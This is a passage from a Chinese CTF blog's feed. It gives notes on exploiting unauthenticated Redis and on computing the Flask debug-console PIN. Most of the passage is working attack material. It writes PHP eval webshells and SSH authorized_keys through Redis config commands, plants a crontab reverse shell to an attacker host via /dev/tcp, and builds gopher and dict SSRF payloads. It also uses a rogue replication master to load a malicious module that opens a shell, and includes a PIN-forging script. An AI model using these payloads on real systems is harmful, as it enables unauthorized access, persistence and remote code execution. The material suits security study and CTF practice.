class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">info <span class="hljs-comment">#查看信息</span><br>CONFIG GET * <span class="hljs-comment">#获取redis的配置信息</span><br>flushall <span class="hljs-comment">#删除所有数据库内容</span><br>flushdb <span class="hljs-comment">#刷新数据库</span><br>KEYS * <span class="hljs-comment">#查看所有键</span><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">test</span> <span class="hljs-string">&quot;whoami&quot;</span> <span class="hljs-comment">#设置变量</span><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> dirpath <span class="hljs-comment">#设置配置项目录的路径</span><br>config get <span class="hljs-built_in">dir</span>/dbfilename <span class="hljs-comment">#获取路径及数据配置信息</span><br>save <span class="hljs-comment">#保存</span><br>get 变量 <span class="hljs-comment">#查看变量名称</span><br>config <span class="hljs-built_in">set</span> requirepass password <span class="hljs-comment">#设置密码</span><br>auth password <span class="hljs-comment">#密码认证</span><br></code></pre></td></tr></table></figure><p><a href="https://www.cnblogs.com/kongzhongqijing/p/6867960.html">https://www.cnblogs.com/kongzhongqijing/p/6867960.html</a></p><h3 id="redis未授权访问漏洞利用"><a class="markdownIt-Anchor" href="#redis未授权访问漏洞利用"></a> Redis未授权访问漏洞利用</h3><p>有未授权漏洞</p><p>（1）配置登录策略导致任意机器都可以登录redis。<br />（2）未设置密码或者设置弱口令。</p><p>无未授权漏洞</p><p>（1）bind 127.0.0.1未注释，仅允许本地访问，攻击机kali无法连接。可尝试本地主从复制rce<br />（2）设置了密码，可以用超级弱口令爆破</p><p>Redis 默认情况下，会绑定在 127.0.0.1:6379，但是有时候开发人员为了方便访问，会将其绑定到0.0.0.0，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空），会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，可以利用 Redis 自身的提供的 config 命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等。其思路都是一样的，就是先将Redis的本地数据库存放目录设置为web目录、~/.ssh目录或/var/spool/cron目录等，然后将dbfilename（本地数据库文件名）设置为文件名你想要写入的文件名称，最后再执行save或bgsave保存，则我们就指定的目录里写入指定的文件了。</p><h4 id="redis写webshell"><a class="markdownIt-Anchor" href="#redis写webshell"></a> redis写webshell</h4><p>需要知道web服务的工作目录，需要有写权限</p><p>监听抓包</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcpdump</span> -i lo -s <span class="hljs-number">0</span> port <span class="hljs-number">6379</span> -w redis.pcap<br></code></pre></td></tr></table></figure><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">auth password</span><br><span class="language-xml">config set dir 工作目录</span><br><span class="language-xml">config set dbfilename webshell.php</span><br><span class="language-xml">set -.- &quot;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&quot;  #也可写入一句话木马</span><br><span class="language-xml">save</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br><br>url = <span class="hljs-string">&quot;http://122.114.254.128:28005&quot;</span>     <span class="hljs-comment">#window上含有ssrf漏洞的页面</span><br>gopher = <span class="hljs-string">&quot;gopher://127.0.0.1:6379/_&quot;</span><br><br><span class="hljs-comment"># 攻击脚本   #一定记着要转义\n</span><br>data = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">auth shell</span><br><span class="hljs-string">set test &quot;\\n\\n&lt;?php @eval($_POST[cmd])?&gt;\\n\\n&quot;   </span><br><span class="hljs-string">config set dir /var/www/html/</span><br><span class="hljs-string">config set dbfilename shell.php</span><br><span class="hljs-string">save</span><br><span class="hljs-string">quit</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encoder_url</span>(<span class="hljs-params">data</span>):<br>    encoder = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> single_char <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-comment"># 先转为ASCII</span><br>        encoder += <span class="hljs-built_in">str</span>(<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(single_char)))<br>    encoder = encoder.replace(<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;%&quot;</span>).replace(<span class="hljs-string">&quot;%a&quot;</span>,<span class="hljs-string">&quot;%0d%0a&quot;</span>)<br>    <span class="hljs-keyword">return</span> encoder<br><br><span class="hljs-comment"># 二次编码</span><br>encoder = url+encoder_url(encoder_url(data))<br><br><span class="hljs-built_in">print</span>(encoder)<br></code></pre></td></tr></table></figure><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">wireshark</span> redis.pcap<br></code></pre></td></tr></table></figure><p>追踪TCP流</p><img src="/2023/08/04/Redis%E6%BC%8F%E6%B4%9E/1.jpg" class=""><img src="/2023/08/04/Redis%E6%BC%8F%E6%B4%9E/2.jpg" class=""><p>复制出payload，url编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">&quot;2a310d0a24370d0a434f4d4d414e440d0a2a320d0a24340d0a617574680d0a24340d0a726f6f740d0a2a340d0a24360d0a636f6e6669670d0a24330d0a7365740d0a24330d0a6469720d0a2431340d0a2f7661722f7777772f68746d6c2f0d0a2a340d0a24360d0a636f6e6669670d0a24330d0a7365740d0a2431300d0a646266696c656e616d650d0a2431320d0a7765627368656c6c2e7068700d0a2a330d0a24330d0a7365740d0a24320d0a2d2d0d0a2432360d0a3c3f706870206576616c28245f504f53545b2761275d293b3f3e0d0a2a310d0a24340d0a736176650d0a&quot;</span><br><br>flag=<span class="hljs-string">&#x27;gopher://127.0.0.1:6379/_&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(payload), <span class="hljs-number">2</span>):<br>   flag+= <span class="hljs-string">&quot;%25&quot;</span> + payload[i:i + <span class="hljs-number">2</span>]<br></code></pre></td></tr></table></figure><h4 id="redis写ssh密钥"><a class="markdownIt-Anchor" href="#redis写ssh密钥"></a> redis写ssh密钥</h4><p>版本&lt;redis-4.0.10,必须是linux，root开的redis,ssh端口有开</p><p>利用redis的备份功能，写入ssh公钥</p><p>ssh端口：22</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">/etc/init.d/ssh start <span class="hljs-comment">#靶机开启ssh服务</span><br>攻击<br>ssh-keygen <span class="hljs-comment">#产生ssh密钥对</span><br>(<span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>;<span class="hljs-built_in">cat</span> ssh.pub; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;\n\n&quot;</span>) &gt; 1.txt <span class="hljs-comment">#将上面生成的公钥保存到1.txt里面</span><br><span class="hljs-built_in">cat</span> 1.txt | redis-cli -h 192.168.224.129 -x <span class="hljs-built_in">set</span> crack <span class="hljs-comment">#将生成的公钥文件通过redis上传到目标服务器 ip要替换为目标服务器地址</span><br>redis-cli -h 192.168.224.129 <span class="hljs-comment">#远程连接redis服务</span><br>flushall<br>config get <span class="hljs-built_in">dir</span> <span class="hljs-comment">#获得redis备份的路径</span><br>config <span class="hljs-built_in">set</span> <span class="hljs-built_in">dir</span> /root/.ssh <span class="hljs-comment">#更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh,需要存在才能利用） </span><br>config <span class="hljs-built_in">set</span> dbfilename authorized_keys <span class="hljs-comment">#设置上传公钥的备份文件名字为authorized_keys</span><br>config get dbfilename <span class="hljs-comment">#检查是否更改成功（查看有没有authorized_keys文件）</span><br>save<br>ssh -i ssh root@192.168.224.129 <span class="hljs-comment">#攻击机直接ssh连接目标服务器</span><br></code></pre></td></tr></table></figure><h4 id="通过写-crontab-的方式-getshell"><a class="markdownIt-Anchor" href="#通过写-crontab-的方式-getshell"></a> 通过写 crontab 的方式 getshell</h4><p>通过设置定时任务反弹shell（仅限于centos）</p><p>对于Ubuntu需要定时任务的目录权限是600，而由Redis创建的文件权限为644，所以没办法反弹shell；</p><p>而centos对于644权限也能够反弹shell</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs swift">redis<span class="hljs-operator">-</span>cli <span class="hljs-operator">-</span>h [<span class="hljs-type">Redis</span> <span class="hljs-type">IP</span><span class="hljs-operator">/</span>域名] <span class="hljs-operator">-</span>p <span class="hljs-number">6379</span> #进入交互<br>config <span class="hljs-keyword">set</span> dir <span class="hljs-operator">/</span><span class="hljs-keyword">var</span><span class="hljs-operator">/</span>spool<span class="hljs-operator">/</span>cron #设置写 crontabs 的文件夹路径<br>config <span class="hljs-keyword">set</span> dbfilename root #修改备份文件名<br><span class="hljs-keyword">set</span> shell <span class="hljs-string">&quot;<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>* * * * * bash -i &gt;&amp; /dev/tcp/198.xx.xx.xxx/9999 0&gt;&amp;1<span class="hljs-subst">\n</span><span class="hljs-subst">\n</span><span class="hljs-subst">\n</span>&quot;</span> # 写入<span class="hljs-operator">「</span>反弹 shell<span class="hljs-operator">」</span>的计划任务<br>save<br></code></pre></td></tr></table></figure><p>公网服务器</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvp <span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><h4 id="redis主从复制"><a class="markdownIt-Anchor" href="#redis主从复制"></a> Redis主从复制</h4><ul><li>攻击机Kali：192.168.224.128</li><li>受害机Ubuntu：192.168.224.129</li></ul><h5 id="利用-redis-rogue-server-工具"><a class="markdownIt-Anchor" href="#利用-redis-rogue-server-工具"></a> 利用 redis-rogue-server 工具</h5><ul><li><p>下载地址：<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p></li><li><p>该工具的原理就是首先创建一个恶意的Redis服务器作为Redis主机（master），该Redis主机能够回应其他连接他的Redis从机的响应。有了恶意的Redis主机之后，就会远程连接目标Redis服务器，通过 <code>slaveof</code> 命令将目标Redis服务器设置为我们恶意Redis的Redis从机（slaver）。然后将恶意Redis主机上的exp同步到Reids从机上，<a href="http://xn--dbfilenameexp-ro1ue91nifi0l0m9kyb.so">并将dbfilename设置为exp.so</a>。最后再控制Redis从机（slaver）加载模块执行系统命令即可。</p><p>但是该工具无法数据Redis密码进行Redis认证，也就是说该工具只能在目标存在Redis未授权访问漏洞时使用。如果目标Redis<strong>存在密码是不能使用该工具</strong>。</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python3</span> redis-rogue-server.<span class="hljs-keyword">py</span> --rhost <span class="hljs-number">192.168</span>.<span class="hljs-number">20.135</span> --lhost <span class="hljs-number">192.168</span>.<span class="hljs-number">20.128</span> --<span class="hljs-built_in">exp</span> <span class="hljs-built_in">exp</span>.<span class="hljs-keyword">so</span><br></code></pre></td></tr></table></figure><p>选择 <code>i</code> 来获得一个交互式的shell，执行在里面执行系统命令即可，也可以选择 <code>r</code> 来获得一个反弹shell。</p></li></ul><h5 id="利用redis-ssrf工具"><a class="markdownIt-Anchor" href="#利用redis-ssrf工具"></a> 利用redis-ssrf工具</h5><p>这个对于Redis存在密码时也可用</p><p><a href="https://github.com/xmsec/redis-ssrf">https://github.com/xmsec/redis-ssrf</a></p><p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p><p>将<code>redis-rogue-server</code>中的<code>exp.io</code>复制到<code>redis-ssrf</code></p><p>修改<code>redis-ssrf</code>中的<code>ssrf-redis.py</code></p><ul><li>将 <code>lhost</code> 改为攻击者vps的ip（47.xxx.xxx.72），用于控制目标Redis服务器连接位于攻击者vps上6666端口上伪造的恶意Redis主机。</li><li>将command修改为要执行的命令</li><li>将第140行的 “127.0.0.1” 改为 “0.0.0.0” ，用于绕过题目对于内网IP的限制。</li><li>最后在第160行填写上Redis的密码 “root”。</li></ul><p>执行ssrf-redis脚本生成payload</p><p>同时运行<code>python2 rogue-server.py</code></p><p>好像说要写个死循环，不然当目标机的Redis连接过来之后，一连上就自动断开连接，可能导致exp.so都没传完就中断了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># do.sh  </span><br><span class="hljs-keyword">while</span> [ <span class="hljs-string">&quot;1&quot;</span> = <span class="hljs-string">&quot;1&quot;</span> ]  <br><span class="hljs-keyword">do</span>  <br>python rogue-server.py  <br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>因为是要ssrf在内网打所以借助gopher协议</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">gopher:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">6379</span>/_auth root<br>config set dir <span class="hljs-regexp">/tmp/</span><br>quit<br><br>gopher:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">6379</span>/_auth root<br>config set dbfilename exp.so<br>slaveof <span class="hljs-number">120.77</span>.<span class="hljs-number">205.20</span> <span class="hljs-number">6666</span><br>quit<br><br><span class="hljs-comment">#执行完上面两个</span><br><span class="hljs-comment">#反弹shell</span><br>gopher:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">6379</span>/_auth root<br>module load <span class="hljs-regexp">/tmp/</span>exp.so<br>system.rev <span class="hljs-number">120.77</span>.<span class="hljs-number">205.20</span> <span class="hljs-number">8000</span><br>quit<br><span class="hljs-comment">#查看环境变量</span><br>gopher:<span class="hljs-regexp">//</span><span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">6379</span>/_auth root<br>module load <span class="hljs-regexp">/tmp/</span>exp.so<br>system.exec env<br>quit<br><br>用赛博厨子对上面指令进行url编码<br></code></pre></td></tr></table></figure><p>dict协议反弹shell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment">#查看当前redis的相关配置</span><br>ssrf.php?url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">172.131</span>:<span class="hljs-number">6379</span>/info<br><br><span class="hljs-comment">#设置备份文件名</span><br>ssrf.php?url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">172.131</span>:<span class="hljs-number">6379</span>/config:set:dbfilename:exp.so<br><br><span class="hljs-comment">#连接恶意Redis服务器</span><br>ssrf.php?url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">172.131</span>:<span class="hljs-number">6379</span>/slaveof:<span class="hljs-number">192.168</span>.<span class="hljs-number">172.129</span>:<span class="hljs-number">1234</span><br><br><span class="hljs-comment">#加载恶意模块</span><br>ssrf.php?url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">172.131</span>:<span class="hljs-number">6379</span><span class="hljs-regexp">/module:load:./</span>exp.so<br><br><span class="hljs-comment">#切断主从复制</span><br>ssrf.php?url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">172.131</span>:<span class="hljs-number">6379</span>/slaveof:no:one<br><br><span class="hljs-comment">#执行系统命令</span><br> ssrf.php?url=dict:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">172.131</span>:<span class="hljs-number">6379</span>/system.rev:<span class="hljs-number">192.168</span>.<span class="hljs-number">172.129</span>:<span class="hljs-number">9999</span><br></code></pre></td></tr></table></figure><p><a href="https://github.com/izj007/wechat/blob/main/articles/%5Bsnowming%5D-2021-8-15-Redis%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8B%BF%20shell%20%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%88%86%E6%9E%90%E3%80%90%E4%B8%8A%E7%AF%87%E3%80%91.md">比较yyds的参考文章1</a></p><p><a href="https://github.com/izj007/wechat/blob/main/articles/%5B%E8%8A%B1%E6%8C%87%E4%BB%A4%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C%E5%AE%A4%5D-2021-8-7-Redis%20%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93.md">比较yyds的参考文章2</a></p>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>flask计算PIN码</title>
    <link href="/2023/07/24/flask%E8%AE%A1%E7%AE%97PIN%E7%A0%81/"/>
    <url>/2023/07/24/flask%E8%AE%A1%E7%AE%97PIN%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h3 id="概念"><a class="markdownIt-Anchor" href="#概念"></a> 概念</h3><p>pin码是 flask应用在开启<strong>debug</strong>的模式下，进入控制台调试模式下所需的进入密码。 相当于是 pyshell</p><p>访问<code>/console</code>进入控制台</p><p>pin码六要素</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">username /etc/passwd进行猜测<br>modname 一般是flask<span class="hljs-selector-class">.app</span><br><span class="hljs-function"><span class="hljs-title">getattr</span><span class="hljs-params">(app, <span class="hljs-string">&quot;__name__&quot;</span>, app.__class__.__name__)</span></span>  一般是Flask<br>moddir flask库下app.py的绝对路径    可以通过报错获取<br><span class="hljs-function"><span class="hljs-title">int</span><span class="hljs-params">(uuid,<span class="hljs-number">16</span>)</span></span>    即当前网络的mac地址的十进制数 #/sys/class/net/eth0/<span class="hljs-selector-tag">address</span><br><span class="hljs-function"><span class="hljs-title">get_machine_id</span><span class="hljs-params">()</span></span>     机器的id<br></code></pre></td></tr></table></figure><p>纯docker机machine-id获取</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs maxima">/proc/sys/kernel/<span class="hljs-built_in">random</span>/boot_id拼接/proc/self/cgroup里<span class="hljs-number">1</span>:中/docker/字符串后面的内容<br>例子<br>26657bfd-2d70-45fa-<span class="hljs-number">97b3</span>-99462feda8930d9d814928e85948f3038055a34d6cf66517e006e8a0e6ec53991f758d0ee6ba<br></code></pre></td></tr></table></figure><p>k8smachine-id 获取</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/m</span>achine-id拼接<span class="hljs-regexp">/proc/</span>self/cgroup里docker-...<br>例子<br><span class="hljs-number">96</span>cec10d3d9307792745ec3b85c89620docker-<span class="hljs-number">6456</span>d01879fc0ce07b1141d1001093bacd10422163bc5622a98159adc7a6c100.scope<br></code></pre></td></tr></table></figure><p>上面需要能够进行文件读取</p><h3 id="flask计算pin码脚本"><a class="markdownIt-Anchor" href="#flask计算pin码脚本"></a> flask计算PIN码脚本</h3><h4 id="高版本"><a class="markdownIt-Anchor" href="#高版本"></a> 高版本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><span class="hljs-keyword">import</span> time<br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;root&#x27;</span>  <span class="hljs-comment"># /etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># 报错得到(传参随便传能报错就行)</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;2485377568585&#x27;</span>,  <span class="hljs-comment"># /sys/class/net/eth0/address 十进制 ba:5c:f6:bc:79:68-》 204908439304552</span><br>    <span class="hljs-string">&#x27;653dc458-4634-42b1-9a7a-b22a082e1fce898ba65fb61b89725c91a48c418b81bf98bd269b6f97002c3d8f69da8594d2d2&#x27;</span> <span class="hljs-comment">#machine-id 由三个合并(docker就后两个)：1. /etc/machine-id   2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span><br>]<br><br><span class="hljs-comment"># 下面为源码里面抄的，不需要修改</span><br>h = hashlib.sha1()<br><span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>        bit = bit.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    h.update(bit)<br>h.update(<span class="hljs-string">b&#x27;cookiesalt&#x27;</span>)<br><br>cookie_name = <span class="hljs-string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="hljs-number">20</span>]<br><br>num = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    h.update(<span class="hljs-string">b&#x27;pinsalt&#x27;</span>)<br>    num = (<span class="hljs-string">&#x27;%09d&#x27;</span> % <span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>))[:<span class="hljs-number">9</span>]<br><br>rv = <span class="hljs-literal">None</span><br><span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>    <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>            rv = <span class="hljs-string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="hljs-string">&#x27;0&#x27;</span>)<br>                          <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        rv = num<br><span class="hljs-built_in">print</span>(rv)<br>cookie = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">int</span>(time.time())) + <span class="hljs-string">&quot;|&quot;</span> + hashlib.sha1(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;rv&#125;</span> added salt&quot;</span>.encode(<span class="hljs-string">&quot;utf-8&quot;</span>, <span class="hljs-string">&quot;replace&quot;</span>)).hexdigest()[:<span class="hljs-number">12</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;cookie为: <span class="hljs-subst">&#123;cookie_name&#125;</span>=<span class="hljs-subst">&#123;cookie&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><h4 id="低版本"><a class="markdownIt-Anchor" href="#低版本"></a> 低版本</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><span class="hljs-keyword">import</span> time<br><br>probably_public_bits = [<br>    <span class="hljs-string">&#x27;root&#x27;</span>  <span class="hljs-comment"># username，通过/etc/passwd</span><br>    <span class="hljs-string">&#x27;flask.app&#x27;</span>,  <span class="hljs-comment"># modname，默认值</span><br>    <span class="hljs-string">&#x27;Flask&#x27;</span>,  <span class="hljs-comment"># 默认值</span><br>    <span class="hljs-string">&#x27;/usr/local/lib/python3.7/site-packages/flask/app.py&#x27;</span>  <span class="hljs-comment"># moddir，通过报错获得</span><br>]<br><br>private_bits = [<br>    <span class="hljs-string">&#x27;25214234362297&#x27;</span>,  <span class="hljs-comment"># mac十进制值 /sys/class/net/ens0/address</span><br>    <span 